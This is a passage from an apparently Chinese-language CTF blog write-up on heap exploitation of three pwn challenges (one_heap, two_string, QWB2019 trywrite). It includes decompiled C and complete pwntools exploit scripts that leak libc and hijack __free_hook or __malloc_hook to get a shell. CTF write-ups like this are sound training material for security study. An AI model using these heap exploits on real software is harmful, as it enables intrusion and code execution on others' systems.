class="selector-tag">0x0</span></span><br></pre></td></tr></table></figure></p><p>然后申请到stdout后泄露信息</p><h4 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp:"></a>完整exp:</h4><p>开启ASLR后进行调试，用其中的一种情况进行爆破,理论上概率是1/256,实际上概率挺大的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(a,<span class="string">'''</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000000D42)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000000DCD)</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    a.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Input the size:"</span>)</span><br><span class="line">    a.sendline(str(size))</span><br><span class="line">    a.recvuntil(<span class="string">"Input the content:"</span>)</span><br><span class="line">    a.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=process(<span class="string">"./one_heap"</span>)</span><br><span class="line">        libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">        add(<span class="number">0x78</span>,<span class="string">'A\n'</span>)</span><br><span class="line">        delete()</span><br><span class="line">        delete()</span><br><span class="line">        <span class="comment">#debug()</span></span><br><span class="line">        add(<span class="number">0x78</span>,<span class="string">'\x10\x60\n'</span>)</span><br><span class="line">        add(<span class="number">0x78</span>,<span class="string">'A\n'</span>)</span><br><span class="line">        add(<span class="number">0x78</span>,<span class="string">'\x00'</span>*<span class="number">5</span>+<span class="string">'\xff'</span>*<span class="number">31</span>+<span class="string">'\n'</span>)</span><br><span class="line">        delete()</span><br><span class="line">        add(<span class="number">0x48</span>,<span class="string">'A\n'</span>)</span><br><span class="line">        add(<span class="number">0x18</span>,<span class="string">'\x60\x57\n'</span>)</span><br><span class="line">        payload=p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x60\n'</span></span><br><span class="line">        <span class="comment">#debug()</span></span><br><span class="line">        add(<span class="number">0x38</span>,payload)</span><br><span class="line">        libc_base=u64(a.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">        success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line">        __free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">        system_addr=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">        <span class="comment">#debug()</span></span><br><span class="line">        add(<span class="number">0x18</span>,p64(__free_hook)+<span class="string">'\n'</span>)</span><br><span class="line">        add(<span class="number">0x78</span>,p64(system_addr)+<span class="string">'\n'</span>)</span><br><span class="line">        add(<span class="number">0x18</span>,<span class="string">"/bin/sh\x00\n"</span>)</span><br><span class="line">        delete()</span><br><span class="line">        a.interactive()</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        a.close</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="中关村ctf-two-string"><a href="#中关村ctf-two-string" class="headerlink" title="中关村ctf-two_string"></a>中关村ctf-two_string</h3><p>19/09/01</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>my_read函数中，当len为0的时候不会加上\x00截断<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">my_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &lt; len )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Read error!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      buf = <span class="number">0</span>;</span><br><span class="line">      v2 = v6++;</span><br><span class="line">      *(_BYTE *)(a1 + v2) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = v6++;</span><br><span class="line">    *(_BYTE *)(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">    *(_BYTE *)(len - <span class="number">1</span> + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>merge_string这个函数看起来是拼接两个函数其实是将一个字符串*2.</p><p>merge_strings函数这里是将选定的几个字符串使用strcat拼接起来:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter a sequence of strings to be merged : "</span>);</span><br><span class="line">  v6 = <span class="number">0x400</span>;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Malloc error!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">"%d"</span>, &amp;v10[i]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)getchar() == <span class="number">10</span> || i == <span class="number">9</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Merge completed!"</span>);</span><br><span class="line">LABEL_38:</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v11;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= i; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v10[j] &lt; <span class="number">0</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10[j] &gt; <span class="number">0x1F</span> || !info_ptr[v10[j]] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Some error!"</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_38;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">0x400</span> &amp;&amp; !v7 )</span><br><span class="line">      v7 = <span class="number">1</span>;</span><br><span class="line">    v5 += info_ptr[v10[j]][<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>这里会将这个几个字符串的size加起来，然后判断是否大于0x400，如果不大于就用strcat进行拼接.<br>这里就可以利用my_read函数当len为0的时候不加\x00进行截断来溢出。</p><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>add一个size为0的string，存放string的chunk就不会添加\x00进行截断，这样就可以利用chunk里的脏数据，例如从unsorted bin chunk中进行切割就可以获得脏数据。通过show函数就可以泄露libc<br>提前准备两个这样size为0，且有脏数据的string chunk，再准备一个size为0x400的chunk，这样再进行size累加计算的时候就是0x400+0+0=0x400，并没有超过0x400。<br>在merge_strings中，strcat拼接的时候会从脏数据的末尾开始拼接，这样就可以进行溢出. libc中的地址一般为6字节，两个就是12字节，这样一共就是0x40c。<br>malloc(0x400)得到的是大小为0x408字节的chunk，这样就溢出了4字节.</p><p>通过溢出造成chunk overlap，将chunk申请到malloc_hook即可.</p><h5 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc:"></a>泄露libc:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x188</span>,<span class="string">'A\n'</span>)<span class="comment">#0</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment"># string chunk  in unsorted bin </span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">a.recvuntil(<span class="string">"are : "</span>)</span><br><span class="line">libc_base=u64(a.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span>-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x10</span></span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br></pre></td></tr></table></figure><p>chunk1是从unsorted bin 中切割的</p><h5 id="构造chunk布局"><a href="#构造chunk布局" class="headerlink" title="构造chunk布局:"></a>构造chunk布局:</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x128</span><span class="number">-0x20</span><span class="number">-0x20</span>,<span class="string">'A\n'</span>)<span class="comment">#2 先malloc掉 unsorted bin chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'A\n'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A\n'</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A\n'</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'A\n'</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x16</span>,<span class="string">'A\n'</span>)<span class="comment">#7</span></span><br></pre></td></tr></table></figure><p>提前申请一个0x400字节的chunk3是为了后面merge_strings时申请到这个chunk进行溢出<br>先malloc掉unsorted bin chunk，是为了后面获得有脏数据的chunk</p><h5 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>) <span class="comment">#放入到unsorted bin中</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#8 有脏数据</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#9 有脏数据</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'A'</span>*(<span class="number">0x400</span><span class="number">-4</span>)+<span class="string">'\x21\x01\x00\x00'</span>)<span class="comment">#10，布置好溢出的数据</span></span><br><span class="line">delete(<span class="number">3</span>)<span class="comment"># free掉 chunk3，为了merge_strings申请到这个chunk</span></span><br><span class="line">merge_strings(<span class="string">"8 9 10"</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">__malloc_hook=libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x68</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=<span class="string">'\x00'</span>*(<span class="number">0x88</span><span class="number">-0x70</span>)+p64(<span class="number">0x71</span>)+p64(__malloc_hook<span class="number">-0x23</span>)</span><br><span class="line">add(<span class="number">0xe0</span><span class="number">-8</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A\n'</span>)</span><br><span class="line">one=libc_base+<span class="number">0xf1147</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A'</span>*<span class="number">0x13</span>+p64(one)+<span class="string">'\n'</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><h4 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp:"></a>完整exp:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">exec_file=<span class="string">"./pwn"</span></span><br><span class="line">context.binary=exec_file</span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(exec_file)</span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    a=process(exec_file)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(a,<span class="string">'''</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000000DC4)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000000F20)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x000000000000E54)</span></span><br><span class="line"><span class="string">    b *(0x555555554000+0x0000000000011C1)</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    a.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Please enter the size of string : "</span>,str(size))</span><br><span class="line">    a.sendafter(<span class="string">"Please enter the string : "</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Please input index : "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">" index : "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_string</span><span class="params">(idx_1,idx_2)</span>:</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"Please enter the first string index : "</span>,str(idx_1))</span><br><span class="line">    a.sendlineafter(<span class="string">"string index : "</span>,str(idx_2))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge_strings</span><span class="params">(s)</span>:</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    a.sendlineafter(<span class="string">"ngs to be merged : "</span>,s)</span><br><span class="line">add(<span class="number">0x188</span>,<span class="string">'A\n'</span>)<span class="comment">#0</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment"># string chunk  in unsorted bin </span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">a.recvuntil(<span class="string">"are : "</span>)</span><br><span class="line">libc_base=u64(a.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span>-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x10</span></span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x128</span><span class="number">-0x20</span><span class="number">-0x20</span>,<span class="string">'A\n'</span>)<span class="comment">#2 先malloc掉 unsorted bin chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'A\n'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A\n'</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A\n'</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'A\n'</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x16</span>,<span class="string">'A\n'</span>)<span class="comment">#7</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">''</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'A'</span>*(<span class="number">0x400</span><span class="number">-4</span>)+<span class="string">'\x21\x01\x00\x00'</span>)<span class="comment">#10</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">merge_strings(<span class="string">"8 9 10"</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">__malloc_hook=libc_base+libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x68</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=<span class="string">'\x00'</span>*(<span class="number">0x88</span><span class="number">-0x70</span>)+p64(<span class="number">0x71</span>)+p64(__malloc_hook<span class="number">-0x23</span>)</span><br><span class="line">add(<span class="number">0xe0</span><span class="number">-8</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A\n'</span>)</span><br><span class="line">one=libc_base+<span class="number">0xf1147</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'A'</span>*<span class="number">0x13</span>+p64(one)+<span class="string">'\n'</span>)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><h3 id="QWB2019-trywrite"><a href="#QWB2019-trywrite" class="headerlink" title="QWB2019 trywrite"></a>QWB2019 trywrite</h3><p>19/9/2</p><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p>程序这里自己实现了一个堆，后面的my_malloc基本是从实现的堆里分配.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"Please tell me where is your heap:"</span>);</span><br><span class="line">v3 = get_ul();</span><br><span class="line">addr = v3;</span><br><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &amp; <span class="number">0xFF0000</span>) == <span class="number">0xFF0000</span>LL || !(v3 &amp; <span class="number">0xFF0000</span>) )</span><br><span class="line">    addr = v3 + <span class="number">0x80000</span>LL;</span><br><span class="line">  heap_addr = mmap((<span class="keyword">void</span> *)addr, size[<span class="number">0</span>], <span class="number">3</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  heap_addr = mmap((<span class="keyword">void</span> *)qword_203010, size[<span class="number">0</span>], <span class="number">3</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br><span class="line">top_chunk = heap_addr;</span><br><span class="line">*(_QWORD *)(heap_addr + <span class="number">8L</span>L) = size[<span class="number">0</span>] + <span class="number">1</span>;   <span class="comment">// size ,prev_inuse</span></span><br></pre></td></tr></table></figure></p><p>my_malloc<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 ret_addr_8; <span class="comment">// ST18_8</span></span><br><span class="line"><span class="keyword">signed</span> __int64 v3; <span class="comment">// ST10_8</span></span><br><span class="line"><span class="keyword">void</span> *ret_addr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">ret_addr = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)ret_addr &gt; heap_addr &amp;&amp; (<span class="keyword">unsigned</span> __int64)ret_addr &lt; heap_addr + ::size[<span class="number">0</span>] )</span><br><span class="line">  <span class="keyword">return</span> ret_addr;</span><br><span class="line">ret_addr_8 = top_chunk + <span class="number">8L</span>L * ((size + <span class="number">16</span>) / <span class="number">8</span>);<span class="comment">// 字节对齐</span></span><br><span class="line">*(_QWORD *)(ret_addr_8 + <span class="number">8</span>) = *(_QWORD *)(top_chunk + <span class="number">8L</span>L) - (size + <span class="number">16</span>);<span class="comment">// 切割假的topchunk</span></span><br><span class="line">*(_QWORD *)(top_chunk + <span class="number">8L</span>L) = size + <span class="number">17</span>;</span><br><span class="line">v3 = top_chunk + <span class="number">16L</span>L;                        <span class="comment">// 返回user data</span></span><br><span class="line">top_chunk = ret_addr_8;                       <span class="comment">// 新的 top chunk</span></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)v3;</span><br></pre></td></tr></table></figure></p><p>打印函数打印的内容是加密过的。<br>加密函数:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 